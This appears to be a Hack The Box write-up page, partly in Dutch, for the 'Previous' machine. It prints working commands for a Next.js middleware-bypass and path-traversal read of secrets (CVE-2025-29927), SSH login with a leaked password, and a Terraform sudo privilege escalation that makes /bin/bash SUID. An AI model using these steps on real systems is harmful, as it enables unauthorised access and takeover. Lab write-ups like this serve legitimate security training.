@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Previous] └─$ nmap 10.129.181.151 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 19:01 CEST Nmap scan report for 10.129.181.151 Host is up (0.043s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-previous/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Previous] └─$ nmap 10.129.181.151 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 19:01 CEST Nmap scan report for 10.129.181.151 Host is up (0.043s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+  <meta itemprop="wordCount" content="508">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Previous] └─$ nmap 10.129.181.151 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 19:01 CEST Nmap scan report for 10.129.181.151 Host is up (0.043s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the services which are open on the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-previous/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Previous]
+└─$ nmap 10.129.181.151    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 19:01 CEST
+Nmap scan report for 10.129.181.151
+Host is up (0.043s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Previous]
+└─$ nmap -sCV 10.129.181.151 -vvvv
+///
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
+|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: PreviousJS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+///
+</code></pre><p>Ik heb door gebruik te maken van whatweb, heb ik gezien dat de user jeremy is waarmee we zullen kunnen inloggen op de ssh server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Previous]
+└─$ whatweb http://previous.htb/ 
+http://previous.htb/ [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.181.151], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
+</code></pre><p>Hier kan je zien dat de website Powered-By <code>Next.js</code> is. Ik zal nu gaan zoeken naar een exploit.</p>
+<pre tabindex="0"><code>curl -s &#39;http://previous.htb/api/download?example=../../../../../../proc/self/cwd/.env&#39; -H &#39;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#39;                                                 
+NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
+
+
+┌──(kali㉿kali)-[~/HTB/Previous/CVE-2025-29927-PoC-Exploit]
+└─$ curl -s &#39;http://previous.htb/api/download?example=../../../../../../proc/self/cwd/.next/server/pages/api/auth/%5B...nextauth%5D.js&#39; \
+  -H &#39;x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware&#39;
+&#34;use strict&#34;;(()=&gt;{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=&gt;{e.exports=r(5600)},5600:e=&gt;{e.exports=require(&#34;next/dist/compiled/next-server/pages-api.runtime.prod.js&#34;)},6435:(e,n)=&gt;{Object.defineProperty(n,&#34;M&#34;,{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:&#34;then&#34;in n&amp;&amp;&#34;function&#34;==typeof n.then?n.then(n=&gt;e(n,r)):&#34;function&#34;==typeof n&amp;&amp;&#34;default&#34;===r?n:void 0}}})},8667:(e,n)=&gt;{Object.defineProperty(n,&#34;A&#34;,{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES=&#34;PAGES&#34;,e.PAGES_API=&#34;PAGES_API&#34;,e.APP_PAGE=&#34;APP_PAGE&#34;,e.APP_ROUTE=&#34;APP_ROUTE&#34;,e.IMAGE=&#34;IMAGE&#34;,e}({})},9832:(e,n,r)=&gt;{r.r(n),r.d(n,{config:()=&gt;l,default:()=&gt;P,routeModule:()=&gt;A});var t={};r.r(t),r.d(t,{default:()=&gt;p});var a=r(3480),s=r(8667),i=r(6435);let u=require(&#34;next-auth/providers/credentials&#34;),o={session:{strategy:&#34;jwt&#34;},providers:[r.n(u)()({name:&#34;Credentials&#34;,credentials:{username:{label:&#34;User&#34;,type:&#34;username&#34;},password:{label:&#34;Password&#34;,type:&#34;password&#34;}},authorize:async e=&gt;e?.username===&#34;jeremy&#34;&amp;&amp;e.password===(process.env.ADMIN_SECRET??&#34;MyNameIsJeremyAndILovePancakes&#34;)?{id:&#34;1&#34;,name:&#34;Jeremy&#34;}:null})],pages:{signIn:&#34;/signin&#34;},secret:process.env.NEXTAUTH_SECRET},d=require(&#34;next-auth&#34;),p=r.n(d)()(o),P=(0,i.M)(t,&#34;default&#34;),l=(0,i.M)(t,&#34;config&#34;),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:&#34;/api/auth/[...nextauth]&#34;,pathname:&#34;/api/auth/[...nextauth]&#34;,bundlePath:&#34;&#34;,filename:&#34;&#34;},userland:t})}};var n=require(&#34;../../../webpack-api-runtime.js&#34;);n.C(e);var r=n(n.s=9832);module.exports=r})();
+</code></pre><table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>jeremy</td>
+          <td>MyNameIsJeremyAndILovePancakes</td>
+      </tr>
+  </tbody>
+</table>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Previous/CVE-2025-29927-PoC-Exploit]
+└─$ ssh jeremy@previous.htb        
+jeremy@previous.htb&#39;s password: MyNameIsJeremyAndILovePancakes
+
+Last login: Sun Aug 24 18:42:58 2025 from 10.10.14.142
+jeremy@previous:~$
+</code></pre><p>User flag: 05d58580914ec460a157840ac595f02b</p>
+<pre tabindex="0"><code>jeremy@previous:~$ cat user.txt 
+05d58580914ec460a157840ac595f02b
+</code></pre><p>Ik ben het sudo -l commando gaan gebruiken voor het zien of dat er geen commando&rsquo;s waren die ik in de naam van de root user kon gaan uitvoeren.</p>
+<pre tabindex="0"><code>jeremy@previous:~$ sudo -l
+[sudo] password for jeremy: 
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+</code></pre><p>Als eerst zullen we een andere directery moeten gaan aanmaken. Hierbij ben ik een directory gaan aanmaken met de naam root. Deze naam kan je zelf beslissen.</p>
+<pre tabindex="0"><code>jeremy@previous:~$ mkdir root
+</code></pre><p>Hierna zal je in een file gaan aanmaken waarin je het /bin/bash commando zult gaan inzetten.</p>
+<pre tabindex="0"><code>jeremy@previous:~/root$ echo &#39;#!/bin/bash 
+chmod u+s /bin/bash&#39; &gt; terraform-provider-examples
+</code></pre><p>Nu zal je als eerst executable rechten moeten gaan geven aan dit bestand. Dit kan je gaan doen door het volgende commando uittevoeren.</p>
+<pre tabindex="0"><code>chmod +x /home/jeremy/root/terraform-provider-examples
+</code></pre><p>Nu kan ik in mijn eigen home directory (<code>/home/jeremy/root</code>) een nep-provider neerzetten (bijvoorbeeld een scriptje dat <code>/bin/bash</code> draait). Wanneer ik daarna <code>sudo terraform apply</code> uitvoer, gebruikt Terraform mijn nep-provider en start die als <strong>root</strong>.</p>
+<pre tabindex="0"><code>sed -i &#39;s/\/usr\/local\/go\/bin/\/home\/jeremy\/root/&#39; /home/jeremy/.terraformrc
+</code></pre><p>Nu zullen we het sudo commando gaan uitvoeren. Hiermee</p>
+<pre tabindex="0"><code>sudo /usr/bin/terraform -chdir=/opt/examples apply
+</code></pre><p>Bash commando als root user opzetten.</p>
+<pre tabindex="0"><code>jeremy@previous:~$ bash -p
+</code></pre><p>Zoals je nu kunt zien hebben we een connectie als de root user.</p>
+<pre tabindex="0"><code>bash-5.1# cat root.txt 
+3eec18b20b61bea39765af77f64f86ce
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
